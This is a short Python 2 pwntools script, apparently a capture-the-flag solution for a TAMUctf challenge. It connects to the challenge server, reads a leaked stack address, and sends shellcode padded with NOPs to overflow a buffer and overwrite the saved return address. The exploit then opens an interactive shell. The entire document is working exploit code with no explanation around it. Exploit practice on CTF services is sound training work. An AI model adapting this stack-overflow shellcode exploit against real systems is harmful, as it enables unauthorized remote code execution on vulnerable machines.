#!/usr/bin/python2

from pwn import *
context.arch = 'i386'
r = remote('pwn.tamuctf.com', 4323)

r.recvuntil('0x')
return_address = r.recvuntil('!')[:-1]

payload = asm(shellcraft.sh())
payload += '\x90'*(0x12a-len(payload))
payload += 'XXXX'			# new ebp
payload += p32(int(return_address,16))

r.sendline(payload)
r.interactive()
